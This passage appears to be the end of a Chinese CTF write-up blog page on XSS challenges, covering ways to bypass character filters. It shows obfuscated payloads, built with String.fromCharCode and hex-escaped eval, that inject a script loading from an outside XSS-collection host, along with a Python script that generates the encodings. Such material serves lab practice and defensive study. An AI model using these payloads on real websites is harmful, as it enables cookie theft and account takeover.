class="variable language_">document</span>.<span class="title function_">close</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;newContent();&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Some original document content.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003011433495.png" alt="image-20221003011433495"></p>
+<ul>
+<li><code>String.fromCharCode():</code></li>
+</ul>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003011512840.png" alt="image-20221003011512840"></p>
+<p>用形如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/οnlοad=“document.write(String.fromCharCode(32));document.write(String.fromCharCode(60));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(114));document.write(String.fromCharCode(73));document.write(String.fromCharCode(112));document.write(String.fromCharCode(116));document.write(String.fromCharCode(32));document.write(String.fromCharCode(115));document.write(String.fromCharCode(114));document.write(String.fromCharCode(67));document.write(String.fromCharCode(61));document.write(String.fromCharCode(47));document.write(String.fromCharCode(47));document.write(String.fromCharCode(120));document.write(String.fromCharCode(115));document.write(String.fromCharCode(46));document.write(String.fromCharCode(115));document.write(String.fromCharCode(98));document.write(String.fromCharCode(47));document.write(String.fromCharCode(89));document.write(String.fromCharCode(84));document.write(String.fromCharCode(85));document.write(String.fromCharCode(104));document.write(String.fromCharCode(62));document.write(String.fromCharCode(60));document.write(String.fromCharCode(47));document.write(String.fromCharCode(115));document.write(String.fromCharCode(67));document.write(String.fromCharCode(82));document.write(String.fromCharCode(105));document.write(String.fromCharCode(112));document.write(String.fromCharCode(84));document.write(String.fromCharCode(62));”</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样的写法去写入即可</p>
+<h4 id="过滤了"><a href="#过滤了" class="headerlink" title="过滤了."></a>过滤了.</h4><ul>
+<li><code>eval()</code>:js中的eval函数会将传入的字符串当做 JavaScript 代码进行执行。</li>
+</ul>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003011846387.png" alt="image-20221003011846387"></p>
+<p>然后eval会识别16进制的字符串,用形如下面这样的例子去绕过：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/οnlοad=eval(&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x36\x37\x2c\x31\x31\x34\x2c\x37\x33\x2c\x31\x31\x32\x2c\x31\x31\x36\x2c\x33\x32\x2c\x31\x31\x35\x2c\x31\x31\x34\x2c\x36\x37\x2c\x36\x31\x2c\x34\x37\x2c\x34\x37\x2c\x31\x32\x30\x2c\x31\x31\x35\x2c\x34\x36\x2c\x31\x31\x35\x2c\x39\x38\x2c\x34\x37\x2c\x38\x39\x2c\x38\x34\x2c\x38\x35\x2c\x31\x30\x34\x2c\x36\x32\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x36\x37\x2c\x38\x32\x2c\x31\x30\x35\x2c\x31\x31\x32\x2c\x38\x34\x2c\x36\x32\x29\x29\x3b&quot;)&gt;</span><br><span class="line">    <span class="comment">&lt;!--document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,47,47,120,115,46,115,98,47,89,84,85,104,62,60,47,115,67,82,105,112,84,62));--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的十六进制字符串可以用下列脚本来生成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a= <span class="string">&quot;&lt;sCrIpt srC=//xs.sb/YTUh&gt;&lt;/sCRipT&gt;&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">  tmp = <span class="built_in">ord</span>(i)</span><br><span class="line">  res += <span class="built_in">str</span>(tmp)</span><br><span class="line">  res+=<span class="string">&quot;,&quot;</span></span><br><span class="line">  res2 +=<span class="string">f&quot;document.write(String.fromCharCode(<span class="subst">&#123;<span class="built_in">str</span>(tmp)&#125;</span>));&quot;</span></span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line"><span class="comment"># print(res2)</span></span><br><span class="line"><span class="comment">#-------------生成脚本分为上下2个，上面的是生成没过滤.的脚本---------------</span></span><br><span class="line">a = <span class="string">&quot;646f63756d656e742e777269746528537472696e672e66726f6d43686172436f64652836302c3131352c36372c3131342c37332c3131322c3131362c33322c3131352c3131342c36372c36312c34372c34372c3132302c3131352c34362c3131352c39382c34372c38392c38342c38352c3130342c36322c36302c34372c3131352c36372c38322c3130352c3131322c38342c363229293b&quot;</span></span><br><span class="line">z = <span class="number">0</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">  <span class="keyword">if</span> z ==<span class="number">2</span>:</span><br><span class="line">    z=<span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> z ==<span class="number">0</span>:</span><br><span class="line">    res+=<span class="string">r&quot;\x&quot;</span></span><br><span class="line">  res += i</span><br><span class="line">  z+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/02/%5BHNCTF%5D-challenge_rce/" rel="prev" title="[HNCTF] challenge_rce">
+      <i class="fa fa-chevron-left"></i> [HNCTF] challenge_rce
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web316"><span class="nav-number">1.</span> <span class="nav-text">Web316</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80"><span class="nav-number">1.1.</span> <span class="nav-text">语法基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.2.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">1.3.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web317"><span class="nav-number">2.</span> <span class="nav-text">Web317</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web318"><span class="nav-number">3.</span> <span class="nav-text">Web318</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web319"><span class="nav-number">4.</span> <span class="nav-text">Web319</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web320"><span class="nav-number">5.</span> <span class="nav-text">Web320</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web321"><span class="nav-number">6.</span> <span class="nav-text">Web321</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web323-Web326"><span class="nav-number">7.</span> <span class="nav-text">Web323-Web326</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93"><span class="nav-number">8.</span> <span class="nav-text">绕过总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="nav-number">8.0.1.</span> <span class="nav-text">过滤空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%9F%90%E4%BA%9B%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="nav-number">8.0.2.</span> <span class="nav-text">过滤某些特殊字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="nav-number">8.0.3.</span> <span class="nav-text">过滤了.</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Boogipop"
+      src="/images/pic.png">
+  <p class="site-author-name" itemprop="name">Boogipop</p>
+  <div class="site-description" itemprop="description">Are you still in pain?</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Boogipop</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
